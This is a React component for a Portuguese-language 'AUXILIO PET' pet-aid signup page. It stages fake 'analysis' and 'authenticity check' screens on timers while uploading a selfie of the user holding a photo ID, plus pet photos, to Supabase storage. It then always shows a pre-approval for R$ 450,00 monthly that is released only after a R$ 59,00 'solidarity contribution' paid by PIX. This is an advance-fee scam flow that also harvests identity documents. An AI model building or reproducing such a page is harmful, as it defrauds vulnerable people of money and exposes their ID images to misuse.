import { useState, useEffect, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import { Heart, CheckCircle2, Sparkles, Users, CreditCard, Camera, Upload, X, PawPrint } from 'lucide-react';
import { supabase } from '../lib/supabase';
import { useAnalytics } from '../hooks/useAnalytics';

interface PetDetails {
  type: 'gato' | 'cachorro' | '';
  breed: string;
  age: string;
  name: string;
}

function Analise() {
  const navigate = useNavigate();
  const [currentStep, setCurrentStep] = useState<'analyzing' | 'selfie' | 'pets' | 'pet-details' | 'document-analyzing' | 'approval' | 'payment'>('analyzing');
  const [selfieFile, setSelfieFile] = useState<File | null>(null);
  const [selfiePreview, setSelfiePreview] = useState<string | null>(null);
  const [petFiles, setPetFiles] = useState<File[]>([]);
  const [petPreviews, setPetPreviews] = useState<string[]>([]);
  const [isUploading, setIsUploading] = useState(false);
  const [numberOfPets, setNumberOfPets] = useState(2);
  const [pets, setPets] = useState<PetDetails[]>([
    { type: '', breed: '', age: '', name: '' },
    { type: '', breed: '', age: '', name: '' }
  ]);
  const selfieInputRef = useRef<HTMLInputElement>(null);
  const petInputRef = useRef<HTMLInputElement>(null);
  const { trackButtonClick } = useAnalytics('analise');

  useEffect(() => {
    const savedQuantity = localStorage.getItem('quantidade_pets');
    if (savedQuantity) {
      const quantity = parseInt(savedQuantity);
      setNumberOfPets(quantity);
      setPets(Array(quantity).fill(null).map(() => ({ type: '', breed: '', age: '', name: '' })));
    }
  }, []);

  useEffect(() => {
    const timer = setTimeout(() => {
      setCurrentStep('selfie');
    }, 3500);

    return () => clearTimeout(timer);
  }, []);

  useEffect(() => {
    if (currentStep === 'document-analyzing') {
      const timer = setTimeout(() => {
        setCurrentStep('approval');
      }, 5000);

      return () => clearTimeout(timer);
    }
  }, [currentStep]);

  const handleSelfieSelect = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file && file.type.startsWith('image/')) {
      setSelfieFile(file);
      const reader = new FileReader();
      reader.onloadend = () => {
        setSelfiePreview(reader.result as string);
      };
      reader.readAsDataURL(file);
    }
  };

  const handlePetFilesSelect = (e: React.ChangeEvent<HTMLInputElement>) => {
    const files = Array.from(e.target.files || []);
    const imageFiles = files.filter(f => f.type.startsWith('image/'));

    if (petFiles.length + imageFiles.length > 5) {
      alert('Você pode enviar no máximo 5 fotos dos seus pets');
      return;
    }

    setPetFiles(prev => [...prev, ...imageFiles]);

    imageFiles.forEach(file => {
      const reader = new FileReader();
      reader.onloadend = () => {
        setPetPreviews(prev => [...prev, reader.result as string]);
      };
      reader.readAsDataURL(file);
    });
  };

  const removePetImage = (index: number) => {
    setPetFiles(prev => prev.filter((_, i) => i !== index));
    setPetPreviews(prev => prev.filter((_, i) => i !== index));
  };

  const handleSelfieSubmit = async () => {
    if (!selfieFile) return;

    setIsUploading(true);

    try {
      const registrationId = localStorage.getItem('registration_id');

      if (!registrationId) {
        console.warn('Registration ID não encontrado, pulando upload');
        setIsUploading(false);
        setCurrentStep('pets');
        return;
      }

      const fileName = `selfie_${registrationId}_${Date.now()}.${selfieFile.name.split('.').pop()}`;

      const { error: uploadError } = await supabase.storage
        .from('user-photos')
        .upload(fileName, selfieFile);

      if (uploadError) {
        console.error('Erro no upload:', uploadError);
      } else {
        await supabase
          .from('registrations')
          .update({ selfie_url: fileName })
          .eq('id', registrationId);
      }

      setTimeout(() => {
        setIsUploading(false);
        setCurrentStep('pets');
      }, 1000);
    } catch (error) {
      console.error('Erro ao fazer upload da selfie:', error);
      setIsUploading(false);
      setCurrentStep('pets');
    }
  };

  const handlePetPhotosSubmit = async () => {
    if (petFiles.length === 0) return;

    setIsUploading(true);

    try {
      const registrationId = localStorage.getItem('registration_id');

      if (!registrationId) {
        console.warn('Registration ID não encontrado, pulando upload');
        setIsUploading(false);
        setCurrentStep('approval');
        return;
      }

      const uploadedUrls: string[] = [];

      for (const file of petFiles) {
        const fileName = `pet_${registrationId}_${Date.now()}_${Math.random().toString(36).substring(7)}.${file.name.split('.').pop()}`;

        const { error: uploadError } = await supabase.storage
          .from('user-photos')
          .upload(fileName, file);

        if (uploadError) {
          console.error('Erro no upload da foto:', uploadError);
        } else {
          uploadedUrls.push(fileName);
        }
      }

      if (uploadedUrls.length > 0) {
        await supabase
          .from('registrations')
          .update({ pet_photos: uploadedUrls })
          .eq('id', registrationId);
      }

      setTimeout(() => {
        setIsUploading(false);
        setCurrentStep('pet-details');
      }, 1000);
    } catch (error) {
      console.error('Erro ao fazer upload das fotos dos pets:', error);
      setIsUploading(false);
      setCurrentStep('pet-details');
    }
  };

  const handlePetDetailsSubmit = async () => {
    if (!pets[0].type || !pets[0].breed || !pets[0].age || !pets[0].name) {
      alert('Por favor, preencha todos os dados do primeiro pet');
      return;
    }

    setIsUploading(true);

    try {
      const registrationId = localStorage.getItem('registration_id');

      if (!registrationId) {
        console.warn('Registration ID não encontrado, pulando salvamento');
        setIsUploading(false);
        setCurrentStep('document-analyzing');
        return;
      }

      for (const pet of pets) {
        if (pet.type && pet.breed && pet.age && pet.name) {
          await supabase.from('pets').insert({
            registration_id: registrationId,
            pet_type: pet.type,
            breed: pet.breed,
            age: pet.age,
            name: pet.name,
          });
        }
      }

      setTimeout(() => {
        setIsUploading(false);
        setCurrentStep('document-analyzing');
      }, 1000);
    } catch (error) {
      console.error('Erro ao salvar dados dos pets:', error);
      setIsUploading(false);
      setCurrentStep('document-analyzing');
    }
  };

  const handleProceedToPayment = () => {
    setCurrentStep('payment');
    setTimeout(() => {
      navigate('/pagamento');
    }, 3000);
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-emerald-950 via-green-900 to-emerald-950 relative overflow-hidden">
      <div className="absolute inset-0 bg-[url('https://images.pexels.com/photos/4587998/pexels-photo-4587998.jpeg?auto=compress&cs=tinysrgb&w=1920')] bg-cover bg-center opacity-10"></div>

      <div className="absolute inset-0">
        <div className="absolute top-0 left-0 w-full h-full bg-gradient-to-br from-emerald-900/50 via-green-900/30 to-transparent"></div>
      </div>

      <nav className="relative z-20 container mx-auto px-3 sm:px-6 lg:px-8">
        <div className="glass-effect rounded-xl sm:rounded-2xl mt-3 sm:mt-6 px-4 sm:px-6 py-3 sm:py-4 flex items-center justify-center">
          <div className="flex items-center gap-2 sm:gap-3">
            <div className="bg-gradient-to-br from-white to-green-50 rounded-lg sm:rounded-xl p-2 sm:p-2.5 shadow-lg shadow-green-500/20">
              <Heart className="text-green-600" size={24} fill="currentColor" />
            </div>
            <span className="text-white text-lg sm:text-xl md:text-2xl font-bold tracking-tight">AUXILIO PET</span>
          </div>
        </div>
      </nav>

      <main className="relative z-10 container mx-auto px-3 sm:px-6 lg:px-8 py-6 sm:py-12">
        <div className="max-w-2xl mx-auto">
          {currentStep === 'analyzing' && (
            <div className="glass-effect rounded-2xl sm:rounded-3xl p-6 sm:p-8 text-center animate-fadeIn">
              <div className="flex justify-center mb-6">
                <div className="relative">
                  <div className="w-20 h-20 sm:w-24 sm:h-24 rounded-full bg-gradient-to-br from-emerald-400 to-green-500 flex items-center justify-center shadow-2xl shadow-green-500/40 animate-pulse">
                    <Sparkles className="text-white" size={40} />
                  </div>
                  <div className="absolute inset-0 rounded-full border-4 border-white/30 animate-spin-slow"></div>
                </div>
              </div>

              <h2 className="text-2xl sm:text-3xl font-bold text-white mb-4">Analisando suas informações</h2>

              <div className="space-y-3 text-white/90 text-base sm:text-lg">
                <p className="animate-fadeInDelay1">Processando respostas do questionário...</p>
                <p className="animate-fadeInDelay2">Avaliando perfil do seu pet...</p>
                <p className="animate-fadeInDelay3">Calculando necessidades e benefícios...</p>
              </div>

              <div className="mt-8 flex justify-center gap-2">
                <div className="w-2.5 h-2.5 bg-white/80 rounded-full animate-bounce" style={{ animationDelay: '0ms' }}></div>
                <div className="w-2.5 h-2.5 bg-white/80 rounded-full animate-bounce" style={{ animationDelay: '150ms' }}></div>
                <div className="w-2.5 h-2.5 bg-white/80 rounded-full animate-bounce" style={{ animationDelay: '300ms' }}></div>
              </div>
            </div>
          )}

          {currentStep === 'selfie' && (
            <div className="glass-effect rounded-2xl sm:rounded-3xl p-6 sm:p-8 animate-fadeIn">
              <div className="text-center mb-6">
                <div className="flex justify-center mb-4">
                  <div className="w-16 h-16 sm:w-20 sm:h-20 rounded-full bg-gradient-to-br from-blue-400 to-blue-600 flex items-center justify-center shadow-2xl shadow-blue-500/50">
                    <Camera className="text-white" size={32} />
                  </div>
                </div>

                <h2 className="text-2xl sm:text-3xl font-bold text-white mb-2">Envie uma selfie</h2>
                <p className="text-white/70 text-sm sm:text-base">
                  Para validar seu cadastro, precisamos de uma foto sua segurando um documento com foto
                </p>
              </div>

              <div className="mb-6">
                {selfiePreview ? (
                  <div className="relative">
                    <img
                      src={selfiePreview}
                      alt="Selfie preview"
                      className="w-full h-48 sm:h-56 md:h-64 object-cover rounded-xl border-2 border-white/20"
                    />
                    <button
                      onClick={() => {
                        setSelfieFile(null);
                        setSelfiePreview(null);
                      }}
                      className="absolute top-2 right-2 p-2 bg-red-500 hover:bg-red-600 rounded-full shadow-lg transition-all"
                    >
                      <X className="text-white" size={20} />
                    </button>
                  </div>
                ) : (
                  <button
                    onClick={() => selfieInputRef.current?.click()}
                    className="w-full h-48 sm:h-56 md:h-64 border-2 border-dashed border-white/30 rounded-xl bg-white/5 active:bg-white/10 hover:bg-white/10 transition-all flex flex-col items-center justify-center gap-2 sm:gap-3 group"
                  >
                    <div className="w-12 h-12 sm:w-14 sm:h-14 md:w-16 md:h-16 rounded-full bg-white/10 flex items-center justify-center group-hover:scale-110 transition-transform">
                      <Camera className="text-white" size={28} />
                    </div>
                    <div className="text-white/70 px-4">
                      <p className="font-semibold mb-1 text-sm sm:text-base">Clique para tirar ou enviar foto</p>
                      <p className="text-xs sm:text-sm text-white/50">Formatos: JPG, PNG</p>
                    </div>
                  </button>
                )}
                <input
                  ref={selfieInputRef}
                  type="file"
                  accept="image/*"
                  capture="user"
                  onChange={handleSelfieSelect}
                  className="hidden"
                />
              </div>

              <button
                onClick={handleSelfieSubmit}
                disabled={!selfieFile || isUploading}
                className="w-full px-6 py-4 bg-gradient-to-r from-green-500 to-emerald-600 hover:from-green-600 hover:to-emerald-700 disabled:from-gray-500 disabled:to-gray-600 disabled:cursor-not-allowed text-white font-bold text-base sm:text-lg rounded-xl shadow-xl shadow-green-500/30 transition-all duration-300 active:scale-95 sm:hover:scale-[1.02] hover:shadow-2xl hover:shadow-green-500/40"
              >
                {isUploading ? 'Enviando...' : 'Continuar'}
              </button>
            </div>
          )}

          {currentStep === 'pets' && (
            <div className="glass-effect rounded-2xl sm:rounded-3xl p-6 sm:p-8 animate-fadeIn">
              <div className="text-center mb-6">
                <div className="flex justify-center mb-4">
                  <div className="w-16 h-16 sm:w-20 sm:h-20 rounded-full bg-gradient-to-br from-purple-400 to-purple-600 flex items-center justify-center shadow-2xl shadow-purple-500/50">
                    <Heart className="text-white" size={32} fill="currentColor" />
                  </div>
                </div>

                <h2 className="text-2xl sm:text-3xl font-bold text-white mb-2">Fotos dos seus pets</h2>
                <p className="text-white/70 text-sm sm:text-base">
                  Envie fotos dos seus pets para concluir o cadastro (máximo 5 fotos)
                </p>
              </div>

              <div className="mb-6">
                {petPreviews.length > 0 && (
                  <div className="grid grid-cols-2 gap-2 sm:gap-3 mb-4">
                    {petPreviews.map((preview, index) => (
                      <div key={index} className="relative">
                        <img
                          src={preview}
                          alt={`Pet ${index + 1}`}
                          className="w-full h-32 sm:h-36 md:h-40 object-cover rounded-lg border-2 border-white/20"
                        />
                        <button
                          onClick={() => removePetImage(index)}
                          className="absolute top-1 right-1 p-1.5 bg-red-500 hover:bg-red-600 rounded-full shadow-lg transition-all"
                        >
                          <X className="text-white" size={16} />
                        </button>
                      </div>
                    ))}
                  </div>
                )}

                {petFiles.length < 5 && (
                  <button
                    onClick={() => petInputRef.current?.click()}
                    className="w-full h-32 sm:h-36 md:h-40 border-2 border-dashed border-white/30 rounded-xl bg-white/5 active:bg-white/10 hover:bg-white/10 transition-all flex flex-col items-center justify-center gap-2 sm:gap-3 group"
                  >
                    <div className="w-12 h-12 sm:w-14 sm:h-14 rounded-full bg-white/10 flex items-center justify-center group-hover:scale-110 transition-transform">
                      <Upload className="text-white" size={24} />
                    </div>
                    <div className="text-white/70 px-4">
                      <p className="font-semibold text-xs sm:text-sm mb-1">
                        {petFiles.length === 0 ? 'Adicionar fotos' : 'Adicionar mais fotos'}
                      </p>
                      <p className="text-xs text-white/50">{petFiles.length}/5 fotos</p>
                    </div>
                  </button>
                )}
                <input
                  ref={petInputRef}
                  type="file"
                  accept="image/*"
                  multiple
                  onChange={handlePetFilesSelect}
                  className="hidden"
                />
              </div>

              <button
                onClick={handlePetPhotosSubmit}
                disabled={petFiles.length === 0 || isUploading}
                className="w-full px-6 py-4 bg-gradient-to-r from-green-500 to-emerald-600 hover:from-green-600 hover:to-emerald-700 disabled:from-gray-500 disabled:to-gray-600 disabled:cursor-not-allowed text-white font-bold text-base sm:text-lg rounded-xl shadow-xl shadow-green-500/30 transition-all duration-300 active:scale-95 sm:hover:scale-[1.02] hover:shadow-2xl hover:shadow-green-500/40"
              >
                {isUploading ? 'Enviando...' : 'Concluir Cadastro'}
              </button>
            </div>
          )}

          {currentStep === 'pet-details' && (
            <div className="glass-effect rounded-2xl sm:rounded-3xl p-6 sm:p-8 animate-fadeIn">
              <div className="text-center mb-6">
                <div className="flex justify-center mb-4">
                  <div className="w-16 h-16 sm:w-20 sm:h-20 rounded-full bg-gradient-to-br from-amber-400 to-orange-500 flex items-center justify-center shadow-2xl shadow-amber-500/50">
                    <PawPrint className="text-white" size={32} />
                  </div>
                </div>

                <h2 className="text-2xl sm:text-3xl font-bold text-white mb-2">Dados dos seus Pets</h2>
                <p className="text-white/70 text-sm sm:text-base">
                  Preencha as informações de {numberOfPets === 1 ? 'seu pet' : `seus ${numberOfPets} pets`}
                </p>
              </div>

              <div className="space-y-6">
                {pets.map((pet, index) => (
                  <div key={index} className="bg-white/10 backdrop-blur-sm border border-white/20 rounded-2xl p-5">
                    <h3 className="text-white font-bold text-lg mb-4 flex items-center gap-2">
                      <PawPrint size={20} />
                      Pet {index + 1} {index === 0 ? '(Obrigatório)' : '(Opcional)'}
                    </h3>

                    <div className="space-y-4">
                      <div>
                        <label className="block text-white/90 text-sm font-semibold mb-2">Tipo de Animal</label>
                        <div className="grid grid-cols-2 gap-3">
                          <button
                            type="button"
                            onClick={() => {
                              const newPets = [...pets];
                              newPets[index] = { ...newPets[index], type: 'cachorro' };
                              setPets(newPets);
                            }}
                            className={`p-4 rounded-xl border-2 transition-all ${
                              pet.type === 'cachorro'
                                ? 'bg-amber-500/30 border-amber-400 text-white'
                                : 'bg-white/5 border-white/20 text-white/70 hover:bg-white/10'
                            }`}
                          >
                            Cachorro
                          </button>
                          <button
                            type="button"
                            onClick={() => {
                              const newPets = [...pets];
                              newPets[index] = { ...newPets[index], type: 'gato' };
                              setPets(newPets);
                            }}
                            className={`p-4 rounded-xl border-2 transition-all ${
                              pet.type === 'gato'
                                ? 'bg-amber-500/30 border-amber-400 text-white'
                                : 'bg-white/5 border-white/20 text-white/70 hover:bg-white/10'
                            }`}
                          >
                            Gato
                          </button>
                        </div>
                      </div>

                      <div>
                        <label className="block text-white/90 text-sm font-semibold mb-2">Nome</label>
                        <input
                          type="text"
                          value={pet.name}
                          onChange={(e) => {
                            const newPets = [...pets];
                            newPets[index] = { ...newPets[index], name: e.target.value };
                            setPets(newPets);
                          }}
                          placeholder="Ex: Rex, Mimi..."
                          className="w-full px-4 py-3 rounded-xl bg-white/10 border border-white/20 text-white placeholder-white/40 focus:outline-none focus:ring-2 focus:ring-amber-500"
                        />
                      </div>

                      <div>
                        <label className="block text-white/90 text-sm font-semibold mb-2">Raça</label>
                        <input
                          type="text"
                          value={pet.breed}
                          onChange={(e) => {
                            const newPets = [...pets];
                            newPets[index] = { ...newPets[index], breed: e.target.value };
                            setPets(newPets);
                          }}
                          placeholder="Ex: Vira-lata, Siamês..."
                          className="w-full px-4 py-3 rounded-xl bg-white/10 border border-white/20 text-white placeholder-white/40 focus:outline-none focus:ring-2 focus:ring-amber-500"
                        />
                      </div>

                      <div>
                        <label className="block text-white/90 text-sm font-semibold mb-2">Idade</label>
                        <input
                          type="text"
                          value={pet.age}
                          onChange={(e) => {
                            const newPets = [...pets];
                            newPets[index] = { ...newPets[index], age: e.target.value };
                            setPets(newPets);
                          }}
                          placeholder="Ex: 2 anos, 6 meses..."
                          className="w-full px-4 py-3 rounded-xl bg-white/10 border border-white/20 text-white placeholder-white/40 focus:outline-none focus:ring-2 focus:ring-amber-500"
                        />
                      </div>
                    </div>
                  </div>
                ))}
              </div>

              <button
                onClick={handlePetDetailsSubmit}
                disabled={isUploading || !pets[0].type || !pets[0].breed || !pets[0].age || !pets[0].name}
                className="w-full mt-6 px-6 py-4 bg-gradient-to-r from-green-500 to-emerald-600 hover:from-green-600 hover:to-emerald-700 disabled:from-gray-500 disabled:to-gray-600 disabled:cursor-not-allowed text-white font-bold text-base sm:text-lg rounded-xl shadow-xl shadow-green-500/30 transition-all duration-300 active:scale-95 sm:hover:scale-[1.02] hover:shadow-2xl hover:shadow-green-500/40"
              >
                {isUploading ? 'Salvando...' : 'Continuar'}
              </button>
            </div>
          )}

          {currentStep === 'document-analyzing' && (
            <div className="glass-effect rounded-2xl sm:rounded-3xl p-6 sm:p-8 text-center animate-fadeIn">
              <div className="flex justify-center mb-6">
                <div className="relative">
                  <div className="w-20 h-20 sm:w-24 sm:h-24 rounded-full bg-gradient-to-br from-blue-400 to-blue-600 flex items-center justify-center shadow-2xl shadow-blue-500/40 animate-pulse">
                    <CheckCircle2 className="text-white" size={40} />
                  </div>
                  <div className="absolute inset-0 rounded-full border-4 border-white/30 animate-spin-slow"></div>
                </div>
              </div>

              <h2 className="text-2xl sm:text-3xl font-bold text-white mb-4">Analisando Documentos</h2>

              <div className="space-y-3 text-white/90 text-base sm:text-lg">
                <p className="animate-fadeInDelay1">Verificando autenticidade da selfie...</p>
                <p className="animate-fadeInDelay2">Validando fotos dos pets...</p>
                <p className="animate-fadeInDelay3">Processando aprovação final...</p>
              </div>

              <div className="mt-8 flex justify-center gap-2">
                <div className="w-2.5 h-2.5 bg-white/80 rounded-full animate-bounce" style={{ animationDelay: '0ms' }}></div>
                <div className="w-2.5 h-2.5 bg-white/80 rounded-full animate-bounce" style={{ animationDelay: '150ms' }}></div>
                <div className="w-2.5 h-2.5 bg-white/80 rounded-full animate-bounce" style={{ animationDelay: '300ms' }}></div>
              </div>
            </div>
          )}

          {currentStep === 'approval' && (
            <div className="glass-effect rounded-2xl sm:rounded-3xl p-6 sm:p-8 animate-fadeIn">
              <div className="text-center mb-6">
                <div className="flex justify-center mb-4">
                  <div className="w-16 h-16 sm:w-20 sm:h-20 rounded-full bg-gradient-to-br from-green-400 to-emerald-500 flex items-center justify-center shadow-2xl shadow-green-500/50 animate-scaleIn">
                    <CheckCircle2 className="text-white" size={40} strokeWidth={2.5} />
                  </div>
                </div>

                <h2 className="text-2xl sm:text-3xl font-bold text-white mb-2">Seu perfil está Pré-Aprovado</h2>
                <div className="inline-block px-4 py-1.5 bg-green-500/20 border border-green-400/40 rounded-full">
                  <span className="text-green-300 text-sm font-semibold">Status: Pré-Aprovado</span>
                </div>
              </div>

              <div className="bg-white/10 backdrop-blur-sm border border-white/20 rounded-2xl p-5 sm:p-6 mb-6">
                <div className="text-center mb-4">
                  <p className="text-white/80 text-sm sm:text-base mb-2">Valor liberado mensal</p>
                  <p className="text-4xl sm:text-5xl font-bold text-white">R$ 450,00</p>
                  <p className="text-white/60 text-xs sm:text-sm mt-2">Infelizmente, no momento não é possível liberar um valor maior.</p>
                </div>
              </div>

              <div className="bg-gradient-to-br from-amber-500/20 to-orange-500/20 border border-amber-400/30 rounded-2xl p-5 sm:p-6 mb-6">
                <div className="flex items-start gap-3 mb-4">
                  <div className="flex-shrink-0 w-10 h-10 rounded-full bg-gradient-to-br from-amber-400 to-orange-500 flex items-center justify-center shadow-lg">
                    <Users className="text-white" size={20} />
                  </div>
                  <div className="flex-1">
                    <h3 className="text-white font-bold text-lg mb-2">Contribuição Solidária</h3>
                    <p className="text-white/90 text-sm sm:text-base leading-relaxed">
                      Para concluir a liberação do Auxílio VetPopular, é necessário realizar a contribuição solidária de <span className="font-bold text-amber-200">R$ 59,00</span>.
                    </p>
                  </div>
                </div>

                <div className="bg-white/10 rounded-xl p-4 border border-white/20">
                  <p className="text-white/90 text-sm leading-relaxed">
                    Essa contribuição é destinada exclusivamente às ONGs e organizações sociais que trabalham no resgate, cuidado e proteção de animais — garantindo que mais famílias e seus pets também sejam ajudados.
                  </p>
                </div>
              </div>

              <div className="bg-green-500/10 border border-green-400/30 rounded-xl p-4 mb-6">
                <p className="text-green-200 text-sm sm:text-base text-center">
                  Após a confirmação da contribuição e a análise final da necessidade, o auxílio é liberado imediatamente.
                </p>
              </div>

              <button
                onClick={handleProceedToPayment}
                className="w-full px-6 py-4 bg-gradient-to-r from-green-500 to-emerald-600 hover:from-green-600 hover:to-emerald-700 active:from-green-700 active:to-emerald-800 text-white font-bold text-base sm:text-lg rounded-xl shadow-xl shadow-green-500/30 transition-all duration-300 active:scale-95 sm:hover:scale-[1.02] hover:shadow-2xl hover:shadow-green-500/40"
              >
                Realizar Contribuição Solidária
              </button>

              <p className="text-white/60 text-xs sm:text-sm text-center mt-4">
                Ao continuar, você concorda com os termos e condições do programa
              </p>
            </div>
          )}

          {currentStep === 'payment' && (
            <div className="glass-effect rounded-2xl sm:rounded-3xl p-6 sm:p-8 text-center animate-fadeIn">
              <div className="flex justify-center mb-6">
                <div className="relative">
                  <div className="w-20 h-20 sm:w-24 sm:h-24 rounded-full bg-gradient-to-br from-green-400 to-emerald-500 flex items-center justify-center shadow-2xl shadow-green-500/40 animate-pulse">
                    <CreditCard className="text-white" size={40} />
                  </div>
                  <div className="absolute inset-0 rounded-full border-4 border-white/30 animate-spin-slow"></div>
                </div>
              </div>

              <h2 className="text-2xl sm:text-3xl font-bold text-white mb-4">Preparando Pagamento</h2>

              <div className="space-y-3 text-white/90 text-base sm:text-lg">
                <p className="animate-fadeInDelay1">Gerando código PIX...</p>
                <p className="animate-fadeInDelay2">Configurando opções de pagamento...</p>
                <p className="animate-fadeInDelay3">Redirecionando para pagamento...</p>
              </div>

              <div className="mt-8 flex justify-center gap-2">
                <div className="w-2.5 h-2.5 bg-white/80 rounded-full animate-bounce" style={{ animationDelay: '0ms' }}></div>
                <div className="w-2.5 h-2.5 bg-white/80 rounded-full animate-bounce" style={{ animationDelay: '150ms' }}></div>
                <div className="w-2.5 h-2.5 bg-white/80 rounded-full animate-bounce" style={{ animationDelay: '300ms' }}></div>
              </div>
            </div>
          )}
        </div>
      </main>

      <style>{`
        @keyframes fadeIn {
          from {
            opacity: 0;
            transform: translateY(20px);
          }
          to {
            opacity: 1;
            transform: translateY(0);
          }
        }

        @keyframes fadeInDelay1 {
          0% {
            opacity: 0;
            transform: translateX(-10px);
          }
          100% {
            opacity: 1;
            transform: translateX(0);
          }
        }

        @keyframes fadeInDelay2 {
          0% {
            opacity: 0;
            transform: translateX(-10px);
          }
          100% {
            opacity: 1;
            transform: translateX(0);
          }
        }

        @keyframes fadeInDelay3 {
          0% {
            opacity: 0;
            transform: translateX(-10px);
          }
          100% {
            opacity: 1;
            transform: translateX(0);
          }
        }

        @keyframes scaleIn {
          0% {
            transform: scale(0);
            opacity: 0;
          }
          50% {
            transform: scale(1.1);
          }
          100% {
            transform: scale(1);
            opacity: 1;
          }
        }

        @keyframes spin-slow {
          from {
            transform: rotate(0deg);
          }
          to {
            transform: rotate(360deg);
          }
        }

        .animate-fadeIn {
          animation: fadeIn 0.6s ease-out forwards;
        }

        .animate-fadeInDelay1 {
          animation: fadeInDelay1 0.6s ease-out 0.5s forwards;
          opacity: 0;
        }

        .animate-fadeInDelay2 {
          animation: fadeInDelay2 0.6s ease-out 1.2s forwards;
          opacity: 0;
        }

        .animate-fadeInDelay3 {
          animation: fadeInDelay3 0.6s ease-out 1.9s forwards;
          opacity: 0;
        }

        .animate-scaleIn {
          animation: scaleIn 0.5s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
        }

        .animate-spin-slow {
          animation: spin-slow 3s linear infinite;
        }
      `}</style>
    </div>
  );
}

export default Analise;
